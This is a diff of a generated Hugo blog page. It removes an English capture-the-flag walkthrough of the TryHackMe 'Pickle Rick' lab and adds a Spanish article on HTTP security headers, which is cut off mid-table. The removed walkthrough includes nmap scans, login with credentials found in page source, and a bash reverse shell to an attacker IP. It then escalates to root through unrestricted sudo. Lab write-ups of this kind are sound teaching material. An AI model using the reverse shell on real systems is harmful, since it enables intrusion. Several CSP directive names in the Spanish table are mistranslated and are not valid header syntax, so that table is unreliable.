@@ -1,26 +1,24 @@
 <!DOCTYPE html>
-<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<html lang="es-es"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">TryHackMe - Machine - Pickle Rick v2 | Hackpuntes</title>
-<meta property="og:title" content="TryHackMe - Machine - Pickle Rick v2 | Hackpuntes" />
-<meta name="twitter:title" content="TryHackMe - Machine - Pickle Rick v2 | Hackpuntes" />
-<meta itemprop="name" content="TryHackMe - Machine - Pickle Rick v2 | Hackpuntes" />
-<meta name="application-name" content="TryHackMe - Machine - Pickle Rick v2 | Hackpuntes" />
+<title itemprop="name">Cabeceras de seguridad HTTP | Hackpuntes</title>
+<meta property="og:title" content="Cabeceras de seguridad HTTP | Hackpuntes" />
+<meta name="twitter:title" content="Cabeceras de seguridad HTTP | Hackpuntes" />
+<meta itemprop="name" content="Cabeceras de seguridad HTTP | Hackpuntes" />
+<meta name="application-name" content="Cabeceras de seguridad HTTP | Hackpuntes" />
 <meta property="og:site_name" content="Hackpuntes" />
 
-<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
-<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
-<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
-<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="description" content="Un tema Hugo veloce e minimalista con supporto per la modalità chiara e scura, per la gestione di un sito o di un blog personale">
+<meta itemprop="description" content="Un tema Hugo veloce e minimalista con supporto per la modalità chiara e scura, per la gestione di un sito o di un blog personale" />
+<meta property="og:description" content="Un tema Hugo veloce e minimalista con supporto per la modalità chiara e scura, per la gestione di un sito o di un blog personale" />
+<meta name="twitter:description" content="Un tema Hugo veloce e minimalista con supporto per la modalità chiara e scura, per la gestione di un sito o di un blog personale" />
 
-<meta property="og:locale" content="en-us" />
-<meta name="language" content="en-us" />
+<meta property="og:locale" content="es-es" />
+<meta name="language" content="es-es" />
 
-  <link rel="alternate" hreflang="en-us" href="http://localhost:1313/posts/thm-machine-pickle-rick-v2/" title="English" />
-
-  <link rel="alternate" hreflang="es" href="http://localhost:1313/es/posts/thm-machine-pickle-rick-v2/" title="Spanish" />
+  <link rel="alternate" hreflang="es" href="http://localhost:1313/es/posts/cabeceras-de-seguridad-http/" title="Spanish" />
 
 
 
@@ -31,9 +29,9 @@
     
 
     <meta property="og:type" content="article" />
-    <meta property="og:article:published_time" content=2025-11-17T00:00:00Z />
-    <meta property="article:published_time" content=2025-11-17T00:00:00Z />
-    <meta property="og:url" content="http://localhost:1313/posts/thm-machine-pickle-rick-v2/" />
+    <meta property="og:article:published_time" content=2019-12-11T00:00:00Z />
+    <meta property="article:published_time" content=2019-12-11T00:00:00Z />
+    <meta property="og:url" content="http://localhost:1313/es/posts/cabeceras-de-seguridad-http/" />
 
     
     <meta property="og:article:author" content="Javier Olmedo" />
@@ -48,16 +46,16 @@
     {
         "@context": "http://schema.org",
         "@type": "Article",
-        "headline": "TryHackMe - Machine - Pickle Rick v2",
+        "headline": "Cabeceras de seguridad HTTP",
         "author": {
         "@type": "Person",
         "name": ""
         },
-        "datePublished": "2025-11-17",
+        "datePublished": "2019-12-11",
         "description": "",
-        "wordCount":  292 ,
+        "wordCount":  1339 ,
         "mainEntityOfPage": "True",
-        "dateModified": "2025-11-17",
+        "dateModified": "2019-12-11",
         "image": {
         "@type": "imageObject",
         "url": ""
@@ -73,33 +71,29 @@
 <meta name="generator" content="Hugo 0.145.0">
 
     
-    <meta property="og:url" content="http://localhost:1313/posts/thm-machine-pickle-rick-v2/">
+    <meta property="og:url" content="http://localhost:1313/es/posts/cabeceras-de-seguridad-http/">
   <meta property="og:site_name" content="Hackpuntes">
-  <meta property="og:title" content="TryHackMe - Machine - Pickle Rick v2">
-  <meta property="og:description" content="Hey hackers! 👋
-Today we’re diving into the Pickle Rick machine on TryHackMe. It’s a classic 🟩 Easy challenge, perfect for practicing web enumeration and basic privilege escalation.
-🚀 Before Starting Add the machine to the /etc/hosts file, check connectivity with ping, and create the working folders
-echo &#39;10.10.34.26\tpicklerick.thm&#39; | sudo tee -a /etc/hosts ping -c 1 picklerick.thm mkdir -p ~/thm/picklerick/{exploits,fuzz,http,nmap} cd ~/thm/picklerick/ 🔎 Reconnaissance Scan with nmap Check all ports that are open, detect the service and its version with nmap and generate all.html to see information.">
-  <meta property="og:locale" content="en_us">
+  <meta property="og:title" content="Cabeceras de seguridad HTTP">
+  <meta property="og:description" content="Las Cabeceras HTTP son parámetros que se envían en una petición o respuesta HTTP entre el cliente y el servidor para proporcionar información esencial sobre la transacción que se esté llevando a cabo. Estas cabeceras siempre utilizan la sintaxis «Cabecera: Valor» y a continuación veremos cuales son las cabeceras de respuesta más importantes enfocándonos en la seguridad.
+HTTP Strict Transport Security (HSTS) Esta cabecera permite indicar a un navegador que siempre se utilice el protocolo HTTPS para establecer la comunicación entre el cliente y servidor (en lugar de HTTP). Esto significa que cualquier marcador, enlace, recurso o dirección forzará a los usuarios a hacer uso de HTTPS, inclusive si el propio usuario especifica el uso de HTTP.">
+  <meta property="og:locale" content="es_es">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-11-17T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-11-17T00:00:00+00:00">
+    <meta property="article:published_time" content="2019-12-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2019-12-11T00:00:00+00:00">
 
 
     
     
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="TryHackMe - Machine - Pickle Rick v2">
-  <meta name="twitter:description" content="Hey hackers! 👋
-Today we’re diving into the Pickle Rick machine on TryHackMe. It’s a classic 🟩 Easy challenge, perfect for practicing web enumeration and basic privilege escalation.
-🚀 Before Starting Add the machine to the /etc/hosts file, check connectivity with ping, and create the working folders
-echo &#39;10.10.34.26\tpicklerick.thm&#39; | sudo tee -a /etc/hosts ping -c 1 picklerick.thm mkdir -p ~/thm/picklerick/{exploits,fuzz,http,nmap} cd ~/thm/picklerick/ 🔎 Reconnaissance Scan with nmap Check all ports that are open, detect the service and its version with nmap and generate all.html to see information.">
+  <meta name="twitter:title" content="Cabeceras de seguridad HTTP">
+  <meta name="twitter:description" content="Las Cabeceras HTTP son parámetros que se envían en una petición o respuesta HTTP entre el cliente y el servidor para proporcionar información esencial sobre la transacción que se esté llevando a cabo. Estas cabeceras siempre utilizan la sintaxis «Cabecera: Valor» y a continuación veremos cuales son las cabeceras de respuesta más importantes enfocándonos en la seguridad.
+HTTP Strict Transport Security (HSTS) Esta cabecera permite indicar a un navegador que siempre se utilice el protocolo HTTPS para establecer la comunicación entre el cliente y servidor (en lugar de HTTP). Esto significa que cualquier marcador, enlace, recurso o dirección forzará a los usuarios a hacer uso de HTTPS, inclusive si el propio usuario especifica el uso de HTTP.">
 
 
     
 
-    <link rel="canonical" href="http://localhost:1313/posts/thm-machine-pickle-rick-v2/">
+    <link rel="canonical" href="http://localhost:1313/es/posts/cabeceras-de-seguridad-http/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -125,13 +119,13 @@ echo &#39;10.10.34.26\tpicklerick.thm&#39; | sudo tee -a /etc/hosts ping -c 1 pi
     
     
 </head>
-<body data-theme = "auto" class="notransition">
+<body data-theme = "dark" class="notransition">
 
 <script src="/js/theme.js"></script>
 
 <div class="navbar" role="navigation">
     <nav class="menu" aria-label="Main Navigation">
-        <a href="http://localhost:1313/" class="logo">
+        <a href="http://localhost:1313/es/" class="logo">
             <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
 viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
 stroke-linejoin="round" class="feather feather-home">
@@ -152,36 +146,43 @@ stroke-linejoin="round" class="feather feather-home">
                 
                 
                 <li>
-                    <a class="menu-link " href="/">
-                        Home
+                    <a class="menu-link " href="/es/">
+                        Inicio
                     </a>
                     
                 </li>
                 
                 <li>
-                    <a class="menu-link active" href="/posts/">
-                        Posts
+                    <a class="menu-link active" href="/es/posts/">
+                        Artículos
                     </a>
                     
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/cheatsheets/">
+                    <a class="menu-link " href="/es/cheatsheets/">
                         Cheatsheets
                     </a>
                     
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/projects/">
-                        Projects
+                    <a class="menu-link " href="/es/projects/">
+                        Proyectos
                     </a>
                     
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/pages/about/">
-                        About
+                    <a class="menu-link " href="/es/pages/cv/">
+                        CV
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/es/pages/about/">
+                        Sobre mí
                     </a>
                     
                 </li>
@@ -190,42 +191,6 @@ stroke-linejoin="round" class="feather feather-home">
                     <span>|</span>
                 </li>
                 
-                
-                    <li>
-                        <select aria-label="Select Language" class="lang-list" id="select-language" onchange="location = this.value;">
-                            
-                            
-                            
-                                
-                                
-                                    
-                                        
-                                        
-                                            <option id="en-us" value="http://localhost:1313/posts/thm-machine-pickle-rick-v2/" selected>EN-US
-                                            </option>
-                                        
-                                    
-                                
-                                    
-                                
-                            
-                                
-                                
-                                    
-                                
-                                    
-                                        
-                                        
-                                            <option id="es" value="http://localhost:1313/es/posts/thm-machine-pickle-rick-v2/">ES-ES</option>
-                                        
-                                    
-                                
-                            
-                        </select>                
-                    </li>
-                    <li class="menu-separator">
-                        <span>|</span>
-                    </li>
                 
             </ul>
             <a id="mode" href="#">
@@ -242,67 +207,321 @@ stroke-linejoin="round" class="feather feather-home">
     <main class="page-content" aria-label="Content">
         <article>
             <header class="header">
-                <h1 class="header-title">TryHackMe - Machine - Pickle Rick v2</h1>
+                <h1 class="header-title">Cabeceras de seguridad HTTP</h1>
                 
                 
                 
                 <div class="post-meta">
-                    <time datetime="2025-11-17T00:00:00&#43;00:00" itemprop="datePublished"> Nov 17, 2025 </time>
+                    <time datetime="2019-12-11T00:00:00&#43;00:00" itemprop="datePublished"> 11 diciembre 2019 </time>
                 </div>
                 
             </header>
             
             <div class="page-content">
-                <p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png"></a></p>
-<p>Hey hackers! 👋</p>
-<p>Today we’re diving into the <a href="https://tryhackme.com/room/picklerick">Pickle Rick machine</a> on TryHackMe. It’s a classic <strong>🟩 Easy</strong> challenge, perfect for practicing web enumeration and basic privilege escalation.</p>
-<h2 id="-before-starting">🚀 Before Starting</h2>
-<p><strong>Add</strong> the machine to the <code>/etc/hosts</code> file, <strong>check connectivity</strong> with <code>ping</code>, and <strong>create the working folders</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;10.10.34.26\tpicklerick.thm&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
-</span></span><span class="line"><span class="cl">ping -c <span class="m">1</span> picklerick.thm
-</span></span><span class="line"><span class="cl">mkdir -p ~/thm/picklerick/<span class="o">{</span>exploits,fuzz,http,nmap<span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~/thm/picklerick/
-</span></span></code></pre></div><h2 id="-reconnaissance">🔎 Reconnaissance</h2>
-<h3 id="scan-with-nmap">Scan with nmap</h3>
-<p>Check <strong>all ports</strong> that are <strong>open</strong>, detect the service and its version with <code>nmap</code> and generate <code>all.html</code> to see information.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sTCV -p- -Pn -A -T4 --min-rate<span class="o">=</span><span class="m">1000</span> -vvv -oA ~/thm/picklerick/nmap/all picklerick.thm
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xsltproc ~/thm/picklerick/nmap/all.xml &gt; ~/thm/picklerick/nmap/all.html
-</span></span></code></pre></div><p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png"></a></p>
-<h3 id="-check-website">🌐 Check website</h3>
-<p>Open firefox to inspect website</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">firefox http://picklerick.thm <span class="p">&amp;</span>
-</span></span></code></pre></div><p>🕵️‍♂️ You can find a username in the source code.</p>
-<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png"></a></p>
-<p>A text string is also found when checking the robots.txt file, which could be the user&rsquo;s password.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://picklerick.thm/robots.txt
-</span></span><span class="line"><span class="cl">xxxxxxxxxxxxxxxxx
-</span></span></code></pre></div><h2 id="-initial-access-foothold">🚪 Initial Access (Foothold)</h2>
-<p>It&rsquo;s clear there must be some kind of login panel or similar. We try the typical <code>login.php</code>, <code>access.php</code>, etc.</p>
-<p>I found <code>login.php</code>, we try with the 🔑 credentials we detected during reconnaissance and Boom&hellip; <strong>we&rsquo;re in!</strong></p>
-<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png"></a></p>
-<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png"></a></p>
-<h3 id="getting-a-reverse-shell">Getting a reverse shell</h3>
-<p>I was trying several payloads, finally I used the <a href="https://www.revshells.com/">Revshells</a> resource to generate a bash payload.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.8.95.209/1337 0&gt;&amp;1&#39;</span>
-</span></span></code></pre></div><p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png"></a></p>
-<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png"></a></p>
-<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png"></a></p>
-<h2 id="-privilege-escalation">🧗‍♂️ Privilege Escalation</h2>
-<p>When viewing the output of <code>sudo -l</code> we can see that any command can be run as sudo.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@ip-10-10-34-26:/var/www/html$ sudo -l
-</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> www-data on ip-10-10-34-26:
-</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
-</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">User www-data may run the following commands on ip-10-10-34-26:
-</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
-</span></span></code></pre></div><p>Now that we are <code>root</code> we can display the contents of the <strong>three flags</strong> at:</p>
-<ul>
-<li>🥒 1st flag &gt; <code>cat /var/www/html/Sup3rS3cretPickl3Ingred.txt</code></li>
-<li>🥒 2nd flag &gt; <code>cat /home/rick/'second ingredients'</code></li>
-<li>🥒 3rd flag &gt; <code>sudo cat /root/3rd.txt</code></li>
-</ul>
-<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png"></a></p>
+                <p>Las <strong>Cabeceras HTTP</strong> son parámetros que se envían en una petición o respuesta HTTP entre el cliente y el servidor para proporcionar información esencial sobre la transacción que se esté llevando a cabo. Estas cabeceras siempre utilizan la sintaxis <strong>«Cabecera: Valor»</strong> y a continuación veremos cuales son las <strong>cabeceras de respuesta</strong> más importantes enfocándonos en la seguridad.</p>
+<h2 id="http-strict-transport-security-hsts">HTTP Strict Transport Security (HSTS)</h2>
+<p>Esta cabecera permite indicar a un navegador que <strong>siempre</strong> se utilice el protocolo HTTPS para establecer la comunicación entre el cliente y servidor (en lugar de HTTP). Esto significa que cualquier marcador, enlace, recurso o dirección forzará a los usuarios a hacer uso de HTTPS, inclusive si el propio usuario especifica el uso de HTTP.</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>Strict-Transport-Security: max-age=31536000 ; includeSubDomains</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>Valor</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>max-age=SECONDS</td>
+          <td>Tiempo, en segundos, que el navegador debe de recordar que solo debe de acceder a la aplicación utilizando HTTPS</td>
+      </tr>
+      <tr>
+          <td>includeSubDomains</td>
+          <td>Si se especifica, esta regla también se aplica a todos los subdominios</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="x-xss-protection">X-XSS-Protection</h2>
+<p>Se utiliza para configurar la protección contra ataques del tipo Cross-Site Scripting (XSS).</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>X-XSS-Protection: 1; mode=block</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>Valor</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0</td>
+          <td>Desactiva la protección</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td>Activa la protección</td>
+      </tr>
+      <tr>
+          <td>1; mode=block</td>
+          <td>Activa la protección y, además, cuando se detecte un ataque XSS en lugar de desinfectar la página se evitará su representación</td>
+      </tr>
+      <tr>
+          <td>1; report=http://[DOMINIO]/mi-reporte</td>
+          <td>Activa la protección y, además, el navegador desinfectará la página e informará del intento de ataque</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="x-content-type-options">X-Content-Type-Options</h2>
+<p>Sólo tiene cun valor válido <strong>nosniff</strong>. Impide que Google Chrome e Internet Explorer intenten detectar el tipo de contenido de una respuesta distinta de la que el servidor declara.</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>X-Content-Type-Options: nosniff</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>Valor</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>nosniff</td>
+          <td>Evita que el navegador detecte una respuesta MIME distinta del tipo de contenido declarado.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="x-frame-options">X-Frame-Options</h2>
+<p>Protege a los visitantes de ataques del tipo <strong>Clickjacking</strong>. Un usuario malintencionado podría cargar un iFrame malicioso en su su servidor y establecer el sitio legítimo como fuente, de esta manera, podría obligar al usuario a hacer click en partes de la aplicación sin ser cosciente de ello.</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>X-Frame-Options: deny</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>Valor</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>deny</td>
+          <td>La más restrictiva, impide que la página pueda ser incluida en un iFrame, incluso si se encuentra en la misma aplicación o dominio</td>
+      </tr>
+      <tr>
+          <td>sameorigin</td>
+          <td>Impide que la página pueda ser incluida en un iFrame salvo que se encuentre en el mismo dominio</td>
+      </tr>
+      <tr>
+          <td>allow-from: DOMINIO</td>
+          <td>Permite cargar la página en iFrames de una única URL permitida</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="content-security-policy">Content Security Policy</h2>
+<p>El encabezado CSP (Content Security Policy) permite definir una <strong>lista blanca</strong> de fuentes de contenido aprobadas para su sitio. Al restringir los activos que un navegador puede cargar para su sitio, como JS y CSS, CSP puede actuar como una contramedida efectiva para los ataques XSS.</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>Content-Security-Policy: script-src 'self'</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>Valor</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>base-uri</td>
+          <td>Defina la base uri para la uri relativa.</td>
+      </tr>
+      <tr>
+          <td>default-src</td>
+          <td>Defina la política de carga para todos los tipos de recursos en caso de que una directiva dedicada de tipo de recurso no esté definida (reserva).</td>
+      </tr>
+      <tr>
+          <td>script-src</td>
+          <td>Defina qué scripts puede ejecutar el recurso protegido.</td>
+      </tr>
+      <tr>
+          <td>object-src</td>
+          <td>Defina desde dónde el recurso protegido puede cargar complementos.</td>
+      </tr>
+      <tr>
+          <td>style-src</td>
+          <td>Defina qué estilos (CSS) aplica el usuario al recurso protegido.</td>
+      </tr>
+      <tr>
+          <td>img-src</td>
+          <td>Defina desde dónde el recurso protegido puede cargar imágenes.</td>
+      </tr>
+      <tr>
+          <td>media-src</td>
+          <td>Defina desde dónde el recurso protegido puede cargar video y audio.</td>
+      </tr>
+      <tr>
+          <td>frame-src</td>
+          <td>En desuso y reemplazado por child-src. Defina desde dónde el recurso protegido puede incrustar marcos.</td>
+      </tr>
+      <tr>
+          <td>child-src</td>
+          <td>Defina desde dónde el recurso protegido puede incrustar marcos.</td>
+      </tr>
+      <tr>
+          <td>antepasados</td>
+          <td>Defina desde dónde se puede incrustar el recurso protegido en marcos.</td>
+      </tr>
+      <tr>
+          <td>font-src</td>
+          <td>Defina desde dónde el recurso protegido puede cargar fuentes.</td>
+      </tr>
+      <tr>
+          <td>connect-src</td>
+          <td>Defina qué URI puede cargar el recurso protegido mediante interfaces de script.</td>
+      </tr>
+      <tr>
+          <td>manifest-src</td>
+          <td>Defina desde dónde el recurso protegido puede cargar el manifiesto.</td>
+      </tr>
+      <tr>
+          <td>forma-acción</td>
+          <td>Defina qué URI se pueden usar como acción de elementos de formulario HTML.</td>
+      </tr>
+      <tr>
+          <td>salvadera</td>
+          <td>Especifica una política de espacio aislado HTML que el agente de usuario aplica al recurso protegido.</td>
+      </tr>
+      <tr>
+          <td>script-nonce</td>
+          <td>Defina la ejecución del script al requerir la presencia del nonce especificado en los elementos del script.</td>
+      </tr>
+      <tr>
+          <td>tipos de plugin</td>
+          <td>Defina el conjunto de complementos que puede invocar el recurso protegido limitando los tipos de recursos que se pueden incrustar.</td>
+      </tr>
+      <tr>
+          <td>reflejado-xss</td>
+          <td>Indica a un agente de usuario que active o desactive cualquier heurística utilizada para filtrar o bloquear ataques de secuencias de comandos entre sitios reflejados, equivalente a los efectos del encabezado X-XSS-Protection no estándar.</td>
+      </tr>
+      <tr>
+          <td>bloquear todo el contenido mixto</td>
+          <td>Evitar que el agente de usuario cargue contenido mixto.</td>
+      </tr>
+      <tr>
+          <td>actualizaciones-inseguras-solicitudes</td>
+          <td>Indica al agente de usuario que descargue recursos inseguros utilizando HTTPS.</td>
+      </tr>
+      <tr>
+          <td>referente</td>
+          <td>Definir la información que el agente de usuario debe enviar en el encabezado Referer.</td>
+      </tr>
+      <tr>
+          <td>report-uri</td>
+          <td>Especifica un URI al que el agente de usuario envía informes sobre infracciones de políticas.</td>
+      </tr>
+      <tr>
+          <td>Reportar a</td>
+          <td>Especifica un grupo (definido en el encabezado Report-To) al que el agente de usuario envía informes sobre infracciones de políticas.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="http-public-key-pins">HTTP Public-Key-Pins</h2>
+<p>HTTP Public Key Pinning (HPKP) es un mecanismo de seguridad que permite a los sitios web HTTPS <strong>desconfiar</strong> en la identidad por parte de usuarios malintencionados que utilizan certificados emitidos por CAs que no son de confianza o fraudulentas.</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>Public-Key-Pins: pin-sha256=&quot;d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM=&quot;; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;; report-uri=&quot;http://example.com/pkp-report&quot;; max-age=10000; includeSubDomains</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>Valor</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>pin-sha256=»SHA256″</td>
+          <td>Cadena entre comillas con clave pública (SPKI) codificada en Base64</td>
+      </tr>
+      <tr>
+          <td>max-age=SEGUNDOS</td>
+          <td>Tiempo, en segundos, que el navegador debe de recordar que solo debe de acceder a la aplicación utilizando la configuración establecida</td>
+      </tr>
+      <tr>
+          <td>includeSubDomains</td>
+          <td>Si se especifica, esta regla también se aplica a todos los subdominios</td>
+      </tr>
+      <tr>
+          <td>report-uri=»URL»</td>
+          <td>Si se especifica, esta regla informa de los errores de validación</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="x-permitted-cross-domain-policies">X-Permitted-Cross-Domain-Policies</h2>
+<p>Un archivo de política entre dominios es un documento XML que otorga a un cliente web, como Adobe Flash Player o Adobe Acrobat (aunque no necesariamente se limita a estos), permiso para manejar datos a través de dominios. Cuando los clientes solicitan contenido alojado en un dominio de origen particular y ese contenido realiza solicitudes dirigidas a un dominio diferente al suyo, el dominio remoto debe alojar un archivo de política de dominio cruzado que otorgue acceso al dominio de origen, permitiendo que el cliente continúe la transacción. Normalmente, una metapolítica se declara en el archivo de política maestra, pero para aquellos que no pueden escribir en el directorio raíz, también pueden declarar una metapolítica utilizando el encabezado de respuesta HTTP X-Permitted-Cross-Domain-Policies.</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>X-Permitted-Cross-Domain-Policies: none</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>Valor</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>none</td>
+          <td>No se permiten archivos de política en ningún lugar del servidor de destino, incluido el archivo de política maestro</td>
+      </tr>
+      <tr>
+          <td>master-only</td>
+          <td>Solo se permite el archivo de política maestra</td>
+      </tr>
+      <tr>
+          <td>by-content-type</td>
+          <td>Solo se permiten los archivos de política que se sirven con Content-Type: text/x-cross-domain-policy</td>
+      </tr>
+      <tr>
+          <td>by-ftp-filename</td>
+          <td>Solo se permiten archivos de política cuyos nombres de archivo sean crossdomain.xml</td>
+      </tr>
+      <tr>
+          <td>all</td>
+          <td>Se permiten todos los archivos de políticas en el dominio</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="referrer-policy">Referrer-Policy</h2>
+<p>El encabezado HTTP de la Política de referencia regula qué información de referencia, enviada en el encabezado Referer, debe incluirse con las solicitudes realizadas.</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>Referrer-Policy: no-referrer</code></p>
+<p><a href="https://www.w3.org/TR/referrer-policy/">https://www.w3.org/TR/referrer-policy/</a></p>
+<h2 id="expect-ct">Expect-CT</h2>
+<p>Un servidor utiliza el encabezado Expect-CT para indicar que los navegadores deben evaluar las conexiones al host que emite el encabezado para el cumplimiento de la transparencia del certificado.</p>
+<p><strong>Ejemplo:</strong></p>
+<p><code>Expect-CT: max-age=86400, enforce, report-uri=&quot;https://foo.example/report&quot;</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>Valor</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>report-uri</td>
+          <td>La directiva opcional report-uri indica la URL a la cual el navegador debe informar las fallas de Expect-CT</td>
+      </tr>
+      <tr>
+          <td>enforce</td>
+          <td>La directiva opcional de cumplimiento es una directiva sin valor que, si está presente, le indica al navegador que se debe hacer cumplir la Política de CT (en lugar de solo el informe) y que el navegador debe rechazar conexiones futuras que violen su Política de CT. Cuando tanto la directiva de cumplimiento como la directiva de informe-uri están presentes, la configuración se conoce como una configuración de «exigir e informar», lo que indica al navegador que se debe hacer cumplir la política de CT y que se deben informar las violaciones</td>
+      </tr>
+      <tr>
+          <td>max-age</td>
